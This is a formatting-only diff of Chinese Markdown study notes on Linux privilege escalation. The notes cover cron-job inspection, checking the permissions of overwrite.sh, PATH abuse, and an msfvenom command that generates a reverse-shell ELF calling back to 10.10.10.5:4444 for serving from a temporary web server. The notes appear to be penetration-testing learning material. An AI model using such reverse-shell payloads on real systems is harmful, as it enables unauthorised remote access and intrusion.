@@ -137,23 +137,23 @@
 
 	1.  查看自动任务
 
-	```
+		```
 		cat /etc/crontab
-	```
+		```
 
 	![[Pasted image 20250505231657.png]]
 
 	2.  查看 .sh 文件
-
+		
 		```
 		locate overwrite.sh
 		```
 
 	3.  查看文件权限
 
-	```
+		```
 		ls -liah /usr/local/bin/overwrite.sh
-	```
+		```
 
 - PATH 环境变量提权
 
@@ -187,9 +187,9 @@
 
 	1.  Msfvenom 创建脚本
 
-	```
+		```
 		sudo msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.10.5 LPORT=4444 -f elf -o shell.elf
-	```
+		```
 
 	2.  架设临时 Web 服务器
 
